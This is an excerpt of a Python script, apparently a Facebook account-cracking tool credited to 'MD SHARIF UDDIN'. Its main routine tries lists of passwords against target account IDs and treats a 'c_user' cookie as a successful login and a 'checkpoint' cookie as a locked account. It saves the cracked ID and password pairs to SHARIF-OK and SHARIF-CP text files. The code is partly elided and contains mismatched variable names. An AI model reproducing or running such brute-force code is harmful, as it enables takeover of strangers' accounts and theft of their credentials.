...
\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\33[1;91m[\33[1;97m=\33[1;91m] \33[1;92mDEVELOPER\033[1;97m ●   \33[1;92mMD SHARIF UDDIN 
\33[1;91m[\33[1;97m=\33[1;91m] \33[1;92mFACEBOOK\033[1;97m  ●   \33[1;92mMD SHARIF   
\33[1;91m[\33[1;97m=\33[1;91m] \33[1;92mGITHUB\033[1;97m    ●   \33[1;92m
\33[1;91m[\33[1;97m=\33[1;91m] \33[1;92mVERSION\033[1;97m   ●   \33[1;92m9.2
...
def mmm(ids,names,passlist):
	...
	try:
		...
		for fikr in passlist:
			...
			Tic=session.cookies.get_dict().keys()
			if "c_user" in TIC:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				
				print('\033[1;92m[SHARI-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/SHARIF-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in TIC:
				if 'y' in pcp:
					
					print('\33[1;31m[SHARIF-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/SHARIF-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in TIC:
				...
				oks.append(ids)
				break
			elif 'checkpoint' in SHARIF:
				if 'y' in pcp:
					print('\33[1;91m[SHARIF-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/SHARIF-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[SHARI-OK] '+cid+' | '+ps+'\033[1;32m')
				open('SHARIF-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[SHARIF-CP] '+cid+' | '+ps+'\33[0;97m')
				open('SHARIF-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
